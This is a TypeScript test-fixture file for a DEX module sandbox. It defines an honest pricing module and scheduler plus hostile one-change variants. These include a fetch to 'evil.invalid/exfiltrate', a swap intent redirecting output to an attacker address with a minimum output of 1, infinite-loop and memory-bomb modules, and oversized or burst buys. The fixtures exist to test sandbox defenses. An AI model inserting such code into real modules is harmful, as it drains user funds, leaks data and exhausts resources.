/**
 * Module fixtures — one source of truth, executed by both runtimes.
 *
 * These are plain JS source strings rather than TS objects on purpose. The
 * sandbox can only take source, and the parity gate is only meaningful if the
 * native runtime executes *the same bytes*. Keeping one representation removes
 * any chance of the two drifting.
 *
 * `loadNative` evaluates a fixture with a fake `globalThis` passed in as a
 * parameter, which shadows the real one — so a fixture assigning
 * `globalThis.spdexModule` cannot touch the host's global scope, and tests
 * stay independent of each other.
 */

import { CONTRACTS, TOKENS } from "@spdex/chain";
import type { ModuleManifest, WireScheduleRequest } from "@spdex/core";
import { honestManifest } from "./fixtures.js";

export const QUOTER = CONTRACTS.uniV3QuoterV2;
export const POOL_ID = "0x00ed26e794b949e18b142f9108429b74ce08ac99"; // real SPX/WETH 1% pool

/**
 * A well-behaved module: reads only declared contracts, stays inside its
 * budget, and is deterministic. Every hostile fixture below is a one-change
 * departure from it.
 */
export const HONEST_MODULE = `
globalThis.spdexModule = {
  apiVersion: "1.0.0",

  async discoverPools(pair, ctx) {
    ctx.log("discovering pools");
    await ctx.call({ to: "${QUOTER}", data: "0x01" });
    return [{
      poolId: "${POOL_ID}",
      token0: pair.tokenA,
      token1: pair.tokenB,
      fee: 10000,
      depth: "123456789",
      label: "SPX/WETH 1%",
    }];
  },

  async quoteBatch(requests, pools, ctx) {
    // Batch-shaped: every read the module needs, in one crossing.
    const results = await ctx.multicall(
      requests.map(function (r) { return { to: "${QUOTER}", data: "0x02" }; })
    );
    return requests.map(function (r, i) {
      return {
        poolId: pools.length > 0 ? pools[0].poolId : "${POOL_ID}",
        tokenIn: r.tokenIn,
        tokenOut: r.tokenOut,
        amountIn: r.amountIn,
        // Deterministic function of the input: no clock, no randomness.
        amountOut: (BigInt(r.amountIn) * 3n).toString(),
        gasEstimate: "150000",
      };
    });
  },

  async buildCalls(quote, params, ctx) {
    return {
      approvals: [{
        token: "${TOKENS.SPX.address}",
        spender: "${CONTRACTS.uniV3SwapRouter02}",
        amount: quote.amountIn,
      }],
      calls: [{ to: "${CONTRACTS.uniV3SwapRouter02}", data: "0xdeadbeef", value: "0" }],
      quotedAmountOut: quote.amountOut,
      gasEstimate: "150000",
      poolIds: [quote.poolId],
    };
  },
};
`;

/**
 * A legal module whose output is only valid *after* JSON serialisation.
 *
 * `liquidity` is an object carrying `toJSON`. The sandbox always marshals
 * through JSON, so it arrives as the string "42". Native only matches if it
 * performs the same round-trip — which is exactly the claim `throughWire` makes.
 *
 * This fixture exists because mutation testing showed the claim was untested:
 * deleting the round-trip from the native runtime broke nothing, since every
 * other fixture returns plain JSON-safe values. Without this, "both runtimes
 * marshal identically" was an assertion in a comment rather than a property.
 */
export const WIRE_SENSITIVE_MODULE = `
globalThis.spdexModule = {
  apiVersion: "1.0.0",

  async discoverPools(pair, ctx) {
    return [{
      poolId: "${POOL_ID}",
      token0: pair.tokenA,
      token1: pair.tokenB,
      fee: 3000,
      depth: { toJSON: function () { return "42"; } },
      label: "wire-sensitive",
    }];
  },

  async quoteBatch(requests, pools, ctx) {
    return requests.map(function (r) {
      return {
        poolId: "${POOL_ID}",
        tokenIn: r.tokenIn,
        tokenOut: r.tokenOut,
        amountIn: r.amountIn,
        amountOut: { toJSON: function () { return "99"; } },
        gasEstimate: "150000",
      };
    });
  },

  async buildCalls(quote, params, ctx) {
    return {
      approvals: [],
      calls: [],
      quotedAmountOut: quote.amountOut,
      gasEstimate: "150000",
      poolIds: [quote.poolId],
    };
  },
};
`;

/** Each entry changes exactly one thing about HONEST_MODULE. */
export const HOSTILE_MODULES = {
  /** Answers buildCalls with a swap intent of its own: where the output goes, and how little is fine. */
  authorsIntent: HONEST_MODULE.replace(
    "      poolIds: [quote.poolId],\n    };",
    '      poolIds: [quote.poolId],\n      intent: { recipient: "0x6666666666666666666666666666666666666666", minAmountOut: "1" },\n    };',
  ),

  /** Reaches for the network. In QuickJS `fetch` is not even defined. */
  reachesForNetwork: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools() { return []; },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        await fetch("https://evil.invalid/exfiltrate");
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /** Reads a contract its manifest never declared. */
  readsUndeclaredContract: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools(pair, ctx) {
        await ctx.call({ to: "0x6666666666666666666666666666666666666666", data: "0x01" });
        return [];
      },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /** Grinds the RPC well past its declared budget. */
  exceedsCallBudget: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools(pair, ctx) {
        const calls = [];
        for (let i = 0; i < 500; i++) calls.push({ to: "${QUOTER}", data: "0x01" });
        await ctx.multicall(calls);
        return [];
      },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /** Burns CPU forever. Caught by the fuel budget. */
  infiniteLoop: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools() { while (true) {} },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /** Exhausts memory. Caught by the allocator ceiling. */
  memoryBomb: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools() {
        const a = [];
        while (true) { a.push(new Array(100000).fill(7)); }
      },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /** Hangs without burning CPU — the case fuel alone cannot catch. */
  neverSettles: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools() { return new Promise(function () {}); },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /** Reaches for a clock and randomness, which would break determinism. */
  nonDeterministic: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools(pair, ctx) {
        return [{
          poolId: "pool-" + Date.now() + "-" + Math.random(),
          token0: pair.tokenA, token1: pair.tokenB,
          fee: 3000, depth: "1", label: "drifting",
        }];
      },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /**
   * Asks for one more read every time it runs.
   *
   * Under the host-driven replay design this is the shape a non-deterministic
   * or grinding module takes: its requested reads never line up with what the
   * host has already fetched, so it never converges. The round cap catches it.
   */
  neverConverges: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools(pair, ctx) {
        // Each replay sees a longer cache and asks for strictly more, so the
        // cursor can never catch up with the request.
        for (var i = 0; i < 64; i++) {
          await ctx.multicall([{ to: "${QUOTER}", data: "0x0" + (i % 10) }]);
        }
        return [];
      },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /** Returns output that does not satisfy the interface. */
  malformedOutput: `
    globalThis.spdexModule = {
      apiVersion: "1.0.0",
      async discoverPools() { return [{ poolId: 42, nonsense: true }]; },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,

  /** Claims a host API version this host does not implement. */
  wrongApiVersion: `
    globalThis.spdexModule = {
      apiVersion: "9.0.0",
      async discoverPools() { return []; },
      async quoteBatch() { return []; },
      async buildCalls(quote, params, ctx) {
        return { approvals: [], calls: [], quotedAmountOut: "0", gasEstimate: "0", poolIds: [] };
      },
    };
  `,
} as const;

/**
 * The parts of a scheduler that hostile fixtures change, one at a time.
 *
 * Built from one template so each hostile scheduler below differs from the
 * honest one in exactly the named part and nowhere else — the diff *is* the
 * attack, as with the venue fixtures, without four copies of the same loop to
 * keep in step.
 */
interface SchedulerParts {
  /** Statements run before deciding anything. */
  prelude: string;
  /** The time the decision is made at. */
  now: string;
  /** Which windows get a buy, given the one open now and the first not yet used. */
  owed: string;
  /** How much each buy spends. */
  amountIn: string;
}

const HONEST_SCHEDULER_PARTS: SchedulerParts = {
  prelude: "",
  now: "BigInt(request.now)",
  // Only the window open now. One missed while no tab was open is skipped.
  owed: "[slot]",
  amountIn: "plan.amountPerBuy",
};

function schedulerSource(change: Partial<SchedulerParts> = {}): string {
  const parts = { ...HONEST_SCHEDULER_PARTS, ...change };
  return `
globalThis.spdexModule = {
  apiVersion: "1.0.0",

  async dueBuys(request, ctx) {
    ${parts.prelude}
    var now = ${parts.now};
    var plans = request.plans.slice().sort(function (a, b) {
      return a.id < b.id ? -1 : a.id > b.id ? 1 : 0;
    });
    var due = [];
    var next = [];
    for (var i = 0; i < plans.length; i++) {
      var plan = plans[i];
      var done = request.progress.filter(function (p) { return p.planId === plan.id; })[0]
        || { buysDone: 0, lastSlot: null };
      var start = BigInt(plan.startAt);
      var interval = BigInt(plan.intervalSeconds);
      var firstUnused = done.lastSlot === null ? 0 : done.lastSlot + 1;
      var left = plan.maxBuys - done.buysDone;
      if (left <= 0) { next.push({ planId: plan.id, at: null }); continue; }
      if (now < start) {
        next.push({ planId: plan.id, at: (start + BigInt(firstUnused) * interval).toString() });
        continue;
      }
      var slot = Number((now - start) / interval);
      if (slot < firstUnused) {
        next.push({ planId: plan.id, at: (start + BigInt(firstUnused) * interval).toString() });
        continue;
      }
      var owed = ${parts.owed};
      for (var j = 0; j < owed.length; j++) {
        due.push({ planId: plan.id, slot: owed[j], amountIn: ${parts.amountIn} });
      }
      left -= owed.length;
      next.push({ planId: plan.id, at: left > 0 ? (start + BigInt(slot + 1) * interval).toString() : null });
    }
    return { due: due, next: next };
  },
};
`;
}

/**
 * A well-behaved scheduler: one full-size buy in the window open now, none
 * for windows already used or missed, nothing after the last buy. Reads
 * nothing, and has nothing to read with.
 */
export const HONEST_SCHEDULER = schedulerSource();

/** Each entry changes exactly one part of HONEST_SCHEDULER. */
export const HOSTILE_SCHEDULERS = {
  /**
   * Keeps its own time instead of the host's.
   *
   * `Date` does not exist in the sandbox, so this throws there; natively it
   * would run, and answer differently every second — which is exactly why a
   * scheduler is given the time rather than allowed to look.
   */
  readsClock: schedulerSource({ now: "BigInt(Math.floor(Date.now() / 1000))" }),

  /** Proposes twice the plan's per-buy amount. */
  oversizes: schedulerSource({ amountIn: "(BigInt(plan.amountPerBuy) * 2n).toString()" }),

  /**
   * Makes up every window missed since the last buy, all at once.
   *
   * The catch-up burst the plans promise never to make: it would defeat the
   * averaging the user asked for, and it is what someone able to delay the app
   * would want to provoke.
   */
  bunchesMissedWindows: schedulerSource({
    owed: "(function () { var s = []; for (var k = firstUnused; k <= slot; k++) s.push(k); return s; })()",
  }),

  /**
   * Reads the chain before deciding — SPX's total supply here, standing in for
   * any market read a "smarter" strategy would want. A scheduler has no
   * business reading anything: its answer must be a function of what the host
   * hands it, so the host can check that answer against the same inputs.
   */
  readsChain: schedulerSource({
    prelude: `await ctx.call({ to: "${TOKENS.SPX.address}", data: "0x18160ddd" });`,
  }),
} as const;

/**
 * A manifest for the scheduler fixtures: kind `scheduler`, and nothing granted
 * — no capabilities, no contracts, no call budget.
 */
export function schedulerManifest(overrides: Partial<ModuleManifest> = {}): ModuleManifest {
  return honestManifest({
    id: "scheduler-fixture",
    kind: "scheduler",
    displayName: "Fixture scheduler",
    description: "Decides which recurring buys are due. Test fixture.",
    capabilities: [],
    contracts: [],
    limits: { maxFuel: 1_000_000n, maxMemory: 8_388_608n, maxCallsPerQuote: 0 },
    ...overrides,
  });
}

const ETH = "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee";
const SCHEDULE_NOW = 1_790_000_000;

/**
 * A request with one plan in each state, listed out of id order.
 *
 * `dca-a-due` bought in window 1, missed window 2 and is in window 3;
 * `dca-b-waiting` has not started; `dca-c-finished` has made every buy;
 * `dca-d-bought` already bought in the window open now. The honest scheduler
 * proposes exactly one buy — window 3 of `dca-a-due` — and each hostile one
 * departs from that in its own way.
 */
export const SAMPLE_SCHEDULE: WireScheduleRequest = {
  now: String(SCHEDULE_NOW),
  plans: [
    { id: "dca-d-bought", sell: ETH, buy: TOKENS.SPX.address, amountPerBuy: "5000000000000000",
      intervalSeconds: "7200", startAt: String(SCHEDULE_NOW - 3_600), maxBuys: 4 },
    { id: "dca-a-due", sell: ETH, buy: TOKENS.SPX.address, amountPerBuy: "1000000000000000",
      intervalSeconds: "3600", startAt: String(SCHEDULE_NOW - 3 * 3_600 - 100), maxBuys: 10 },
    { id: "dca-c-finished", sell: TOKENS.WETH.address, buy: TOKENS.SPX.address, amountPerBuy: "20000000000000000",
      intervalSeconds: "86400", startAt: String(SCHEDULE_NOW - 10 * 86_400), maxBuys: 2 },
    { id: "dca-b-waiting", sell: ETH, buy: TOKENS.SPX.address, amountPerBuy: "3000000000000000",
      intervalSeconds: "86400", startAt: String(SCHEDULE_NOW + 600), maxBuys: 5 },
  ],
  progress: [
    { planId: "dca-a-due", buysDone: 1, lastSlot: 1 },
    { planId: "dca-c-finished", buysDone: 2, lastSlot: 5 },
    { planId: "dca-d-bought", buysDone: 1, lastSlot: 0 },
  ],
};

/**
 * Evaluate a fixture into a module object for the native runtime.
 *
 * `globalThis` is a *parameter*, so the fixture's assignment lands on a throwaway
 * object rather than the host's real global — one fixture cannot affect another,
 * and a hostile fixture cannot reach the host through the global scope.
 */
export function loadNative(code: string): unknown {
  const factory = new Function(
    "globalThis",
    `"use strict";\n${code}\nreturn globalThis.spdexModule;`,
  );
  return factory(Object.create(null));
}
